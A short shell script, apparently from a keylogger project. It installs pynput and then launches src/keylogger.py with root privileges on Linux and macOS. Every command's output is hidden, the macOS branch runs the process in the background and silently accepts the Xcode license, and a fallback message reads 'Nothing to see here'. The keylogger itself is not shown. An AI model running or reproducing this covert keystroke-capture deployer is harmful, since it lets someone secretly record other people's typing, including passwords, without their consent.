#!/bin/sh

if [[ "$OSTYPE" == "linux-gnu" ]]; then
  echo "Linux Specific instructions"
  sudo apt install python3-pip -y >/dev/null 2>&1
  pip3 install --upgrade pip >/dev/null 2>&1
  pip3 install pynput --user >/dev/null 2>&1
  sudo python3 src/keylogger.py >/dev/null 2>&1
elif [[ "$OSTYPE" == "darwin"* ]]; then
  echo "Mac Specific instructions"
  sudo xcodebuild -license accept >/dev/null 2>&1
  sudo python -m ensurepip >/dev/null 2>&1
  pip install pynput --user >/dev/null 2>&1
  sudo python src/keylogger.py >/dev/null 2>&1 &
elif [[ "$OSTYPE" == "cygwin" ]]; then
  echo "Cygwin specific instructions"
elif [[ "$OSTYPE" == "msys" ]]; then
  echo "MinGW specific instructions"
else
  echo "Nothing to see here. Move along . . ."
fi
